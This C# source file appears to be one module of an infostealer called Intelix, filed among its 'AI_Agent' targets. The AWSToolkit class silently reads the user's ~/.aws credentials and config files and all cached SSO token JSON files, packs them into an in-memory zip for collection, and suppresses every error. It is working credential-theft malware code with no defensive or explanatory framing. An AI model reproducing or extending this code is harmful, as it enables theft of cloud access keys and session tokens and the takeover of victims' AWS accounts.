using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class AWSToolkit : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string awsDir = Path.Combine(userProfile, ".aws");
            if (!Directory.Exists(awsDir)) return;
            var entry = new Counter.CounterApplications { Name = "AWS Toolkit" };
            string[] targetFiles = {
                Path.Combine(awsDir, "credentials"),
                Path.Combine(awsDir, "config")
            };
            foreach (string file in targetFiles)
            {
                if (!File.Exists(file)) continue;
                try
                {
                    string rel = "AI-Agent\\AWSToolkit\\" + Path.GetFileName(file);
                    zip.AddFile(rel, File.ReadAllBytes(file));
                    entry.Files.Add(file + " => " + rel);
                }
                catch { }
            }
            string ssoCache = Path.Combine(awsDir, "sso", "cache");
            if (Directory.Exists(ssoCache))
            {
                foreach (string file in Directory.GetFiles(ssoCache, "*.json"))
                {
                    try
                    {
                        string rel = "AI-Agent\\AWSToolkit\\sso\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
